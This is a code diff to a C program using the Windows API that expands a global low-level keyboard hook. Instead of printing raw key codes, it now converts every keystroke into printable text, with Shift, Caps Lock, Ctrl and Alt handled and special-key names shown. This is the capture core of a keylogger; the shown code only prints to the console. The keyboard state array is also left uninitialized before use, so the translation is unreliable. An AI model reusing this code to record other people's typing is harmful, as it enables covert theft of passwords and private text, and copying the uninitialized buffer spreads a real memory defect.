@@ -23,7 +23,66 @@ LRESULT CALLBACK hook_procedure(int code, WPARAM wparam, LPARAM lparam) {
         (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)) {
 
         KBDLLHOOKSTRUCT const* input = (KBDLLHOOKSTRUCT const*) lparam;
-        printf("vkCode = %d\n", input->vkCode);
+        
+        BYTE keyboard[256];
+        if (GetAsyncKeyState(VK_SHIFT) & 32768) {
+            keyboard[VK_SHIFT] |= 128;
+        } else {
+            keyboard[VK_SHIFT] = 0;
+        }
+
+        if (GetKeyState(VK_CAPITAL) & 1) {
+            keyboard[VK_CAPITAL] |= 1;
+        } else {
+            keyboard[VK_CAPITAL] = 0;
+        }
+
+        WCHAR buffer[4] = { 0 };
+        int const count = ToUnicode(
+            input->vkCode,
+            input->scanCode,
+            keyboard,
+            buffer,
+            sizeof(buffer) / sizeof(*buffer),
+            0);
+
+        if (count && buffer[0] >= 32 && buffer[0] != 127) {
+            BOOL const ctrl = (GetAsyncKeyState(VK_CONTROL) & 32768);
+            BOOL const alt = (GetAsyncKeyState(VK_MENU) & 32768);
+
+            if (ctrl) {
+                if (alt) {
+                    printf("[Ctrl + Alt + %ls]", buffer);
+                } else {
+                    printf("[Ctrl + %ls]", buffer);
+                }
+            } else if (alt) {
+                printf("[Alt + %ls]", buffer);
+            } else {
+                printf("%ls", buffer);
+            }
+        } else if (input->vkCode != VK_CAPITAL &&
+            input->vkCode != VK_LSHIFT &&
+            input->vkCode != VK_RSHIFT &&
+            input->vkCode != VK_LCONTROL &&
+            input->vkCode != VK_RCONTROL &&
+            input->vkCode != VK_LMENU &&
+            input->vkCode != VK_RMENU) {
+
+            LONG key = (input->scanCode & 255) << 16;
+            if (input->flags & LLKHF_EXTENDED) {
+                key |= 1 << 24;
+            }
+
+            WCHAR name[64] = { 0 };
+            if (GetKeyNameTextW(
+                key,
+                name,
+                sizeof(name) / sizeof(*name)) > 0) {
+
+                printf("[%ls]", name);
+            }
+        }
     }
 
     return CallNextHookEx(NULL, code, wparam, lparam);
